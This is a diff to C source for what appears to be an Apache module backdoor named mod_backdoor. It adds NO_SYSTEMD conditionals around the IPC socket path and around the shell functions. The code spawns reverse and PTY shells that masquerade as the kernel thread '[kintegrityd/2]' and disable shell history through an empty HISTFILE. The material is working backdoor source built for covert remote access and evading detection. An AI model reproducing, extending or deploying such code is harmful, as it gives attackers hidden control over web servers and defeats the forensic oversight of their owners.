@@ -48,7 +48,11 @@
 #define REVERSESHELL  "/reverse"
 #define BINDWORD      "/bind"
 #define CGROUP2       "/tmp/cgroup2"
+#ifdef NO_SYSTEMD
+#define IPC           "/var/run/mod_backdoor.sock"
+#else
 #define IPC           "/tmp/mod_backdoor"
+#endif
 
 /* PID of the forked IPC daemon (set in backdoor_post_config) */
 pid_t pid;
@@ -181,7 +185,11 @@ static void shell(char *ip, char *port, char *prog) {
     if (spid != 0) { exit(0); }
 
     /* Child process */
+    #ifdef NO_SYSTEMD
+    char *argv[] = { "sh", 0 };
+    #else
     char *argv[] = { "[kintegrityd/2]", 0 };
+    #endif
     char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
     setsid();
 
@@ -276,9 +284,13 @@ static void shellPTY(int socket) {
 
     if (fpid == 0) {
         /* Child: exec a shell on the pty slave */
-        char *argv[] = { "[kintegrityd/2]", 0 };
-        char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
-        execve("/bin/sh", argv, envp);
+      #ifdef NO_SYSTEMD
+      char *argv[] = { "sh", 0 };
+      #else
+      char *argv[] = { "[kintegrityd/2]", 0 };
+      #endif
+      char *envp[] = { "HISTFILE=", "TERM=vt100", 0 };
+      execve("/bin/sh", argv, envp);
     }
 
     /* Parent: configure terminal, then relay data */
